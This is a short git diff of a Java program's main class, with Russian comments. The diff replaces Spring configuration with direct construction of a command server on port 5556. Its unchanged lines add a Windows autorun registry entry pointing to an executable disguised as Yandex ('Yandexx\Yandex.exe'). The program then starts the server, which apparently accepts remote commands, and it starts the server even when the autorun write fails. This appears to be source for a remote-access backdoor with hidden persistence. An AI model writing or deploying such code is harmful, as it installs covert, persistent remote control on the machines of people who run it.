@@ -1,10 +1,8 @@
 package ru.at0m1cc;
 
-import org.springframework.context.support.ClassPathXmlApplicationContext;
-
 import java.io.IOException;
 /**
- * Главный класс c использованием Spring framework
+ * Главный класс
  * @author at0m1cc
  * @version 1.0
  * */
@@ -17,14 +15,12 @@ public class Main {
         try {
             // Добавление в автозагрузку
             Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 1 /t REG_SZ /d \"C:\\Program Files\\Yandexx\\Yandex.exe\"");
-            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
-            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
+            ServerLogic serv = new ServerLogic(5556, new Commands());
             //  Запуск сервера
             serv.start();
         } catch (IOException e) {
-            // Если по каким-то причинам добавление в автозагруку не получилось, просто запускаем сервер
-            ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");
-            ServerLogic serv = (ServerLogic) context.getBean("serverLogic");
+            // Если по каким-то причинам добавление в автозагрузку не получилось, просто запускаем сервер
+            ServerLogic serv = new ServerLogic(5556, new Commands());
             serv.start();
         }
     }
